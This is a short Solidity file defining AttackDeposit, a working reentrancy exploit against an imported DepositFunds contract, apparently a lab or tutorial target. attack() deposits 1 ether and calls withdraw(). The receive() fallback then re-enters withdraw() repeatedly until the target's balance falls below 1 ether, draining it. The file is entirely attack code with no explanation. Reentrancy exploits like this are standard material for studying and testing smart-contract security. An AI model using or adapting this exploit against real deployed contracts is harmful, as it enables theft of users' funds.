//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import './DepositFunds.sol';

contract AttackDeposit {
    DepositFunds public depositFunds;
    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }
    receive() external payable {
        if (address(depositFunds).balance >= 10 ** 18) {
            depositFunds.withdraw();
        }
    }
    function attack() external payable {
        require(msg.value >= 10 ** 18);
        depositFunds.deposit{value: 10 ** 18}();
        depositFunds.withdraw();
    }
}